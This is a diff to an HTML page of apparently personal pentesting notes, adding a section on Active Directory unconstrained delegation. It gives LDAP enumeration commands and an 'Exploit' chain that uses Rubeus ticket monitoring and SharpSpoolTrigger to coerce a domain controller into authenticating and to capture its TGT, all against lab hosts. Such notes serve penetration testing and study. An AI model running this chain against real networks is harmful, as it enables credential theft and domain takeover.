@@ -3247,6 +3247,30 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#force-dc-to-auth-to-our-box-and-steal-tgt" class="md-nav__link">
+    <span class="md-ellipsis">
+      Force DC to auth to our box and steal tgt
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3678,6 +3702,30 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#force-dc-to-auth-to-our-box-and-steal-tgt" class="md-nav__link">
+    <span class="md-ellipsis">
+      Force DC to auth to our box and steal tgt
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3700,8 +3748,29 @@
   <h1>Unconstrained Delegation</h1>
 
 <h2 id="identify">Identify</h2>
+<p>Linux - remote
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="m">192</span>.168.0.104<span class="w"> </span>-u<span class="w"> </span>harry<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>--trusted-for-delegation
 </span></code></pre></div>
+Windows - local
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">ADSearch</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-search</span> <span class="s2">&quot;(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> <span class="p">-</span><span class="n">-attributes</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">dnshostname</span>
+</span></code></pre></div></p>
+<div class="admonition alert">
+<p class="admonition-title">Domain Controllers are always permitted for unconstrained delegation.</p>
+</div>
+<h2 id="exploit">Exploit</h2>
+<h3 id="force-dc-to-auth-to-our-box-and-steal-tgt">Force DC to auth to our box and steal tgt</h3>
+<p>Monitor for tickets with Rubeus
+<div class="language-bat highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Rubeus.exe monitor /interval:10 /nowrap
+</span></code></pre></div>
+Run <a href="https://github.com/cube0x0/SharpSystemTriggers">https://github.com/cube0x0/SharpSystemTriggers</a> to coerce authentication
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">SharpSpoolTrigger</span><span class="p">.</span><span class="n">exe</span> <span class="n">dc01</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">web</span><span class="p">.</span><span class="n">dev</span><span class="p">.</span><span class="n">lav</span><span class="p">.</span><span class="n">local</span>
+</span></code></pre></div>
+Where:</p>
+<ul>
+<li>DC01 is the "target".</li>
+<li>WEB is the "listener".
+<strong>Rebeus should capture a ticket</strong></li>
+</ul>
 
 
 
